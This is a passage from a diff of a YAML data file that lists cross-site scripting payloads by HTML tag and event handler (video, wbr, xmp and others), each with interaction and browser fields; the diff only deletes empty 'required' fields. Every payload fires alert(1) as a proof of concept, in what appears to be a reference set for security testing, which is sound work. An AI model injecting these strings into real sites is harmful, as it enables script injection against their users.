     payloads:
     - <video oncanplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7333,7 +6495,6 @@ video:
   oncanplaythrough:
     payloads:
     - <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7342,7 +6503,6 @@ video:
   ondurationchange:
     payloads:
     - <video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7351,7 +6511,6 @@ video:
   onended:
     payloads:
     - <video controls autoplay onended=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7360,7 +6519,6 @@ video:
   onerror:
     payloads:
     - <video src/onerror=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7369,7 +6527,6 @@ video:
   onfocus:
     payloads:
     - <video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7377,7 +6534,6 @@ video:
   onfocusin:
     payloads:
     - <video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7385,14 +6541,12 @@ video:
   onfullscreenchange:
     payloads:
     - <video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
-    required: []
     interaction: true
     browsers:
     - firefox
   onloadeddata:
     payloads:
     - <video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7401,7 +6555,6 @@ video:
   onloadedmetadata:
     payloads:
     - <video autoplay onloadedmetadata=alert(1)> <source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7410,14 +6563,12 @@ video:
   onmozfullscreenchange:
     payloads:
     - <video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
-    required: []
     interaction: true
     browsers:
     - firefox
   onpaste:
     payloads:
     - <video onpaste="alert(1)" contenteditable>test</video>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7426,7 +6577,6 @@ video:
   onpause:
     payloads:
     - <video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7435,7 +6585,6 @@ video:
   onplay:
     payloads:
     - <video autoplay onplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7444,7 +6593,6 @@ video:
   onplaying:
     payloads:
     - <video autoplay onplaying=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7453,7 +6601,6 @@ video:
   onprogress:
     payloads:
     - <video controls onprogress=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7462,7 +6609,6 @@ video:
   onseeked:
     payloads:
     - <video autoplay controls onseeked=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7471,7 +6617,6 @@ video:
   onseeking:
     payloads:
     - <video autoplay controls onseeking=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7481,7 +6626,6 @@ video:
     payloads:
     - <video controls autoplay ontimeupdate=alert(1)><source src="validvideo.mp4"
       type="video/mp4"></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7491,7 +6635,6 @@ video:
     payloads:
     - <video autoplay controls onvolumechange=alert(1)><source src="validvideo.mp4"
       type="video/mp4"></video>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7501,14 +6644,12 @@ video2:
   onfocus:
     payloads:
     - <video controls src=1 onfocus=alert(1) autofocus>
-    required: []
     interaction: false
     browsers:
     - chrome
   onfocusin:
     payloads:
     - <video controls src=1 onfocusin=alert(1) autofocus>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7516,7 +6657,6 @@ wbr:
   onbeforecopy:
     payloads:
     - <wbr onbeforecopy="alert(1)" contenteditable>test</wbr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7525,7 +6665,6 @@ wbr:
   onbeforecut:
     payloads:
     - <wbr onbeforecut="alert(1)" contenteditable>test</wbr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7534,7 +6673,6 @@ wbr:
   onfocus:
     payloads:
     - <wbr id=x tabindex=1 onfocus=alert(1)></wbr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7542,7 +6680,6 @@ wbr:
   onfocusin:
     payloads:
     - <wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7550,7 +6687,6 @@ wbr:
   onpaste:
     payloads:
     - <wbr onpaste="alert(1)" contenteditable>test</wbr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7560,7 +6696,6 @@ xmp:
   onbeforecopy:
     payloads:
     - <xmp onbeforecopy="alert(1)" contenteditable>test</xmp>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7569,7 +6704,6 @@ xmp:
   onbeforecut:
     payloads:
     - <xmp onbeforecut="alert(1)" contenteditable>test</xmp>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7578,7 +6712,6 @@ xmp:
   onfocus:
     payloads:
     - <xmp id=x tabindex=1 onfocus=alert(1)></xmp>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7586,7 +6719,6 @@ xmp:
   onfocusin:
     payloads:
     - <xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7594,7 +6726,6 @@ xmp:
   onpaste:
     payloads:
     - <xmp onpaste="alert(1)" contenteditable>test</xmp>
-    required: []
     interaction: true
     browsers:
     - chrome
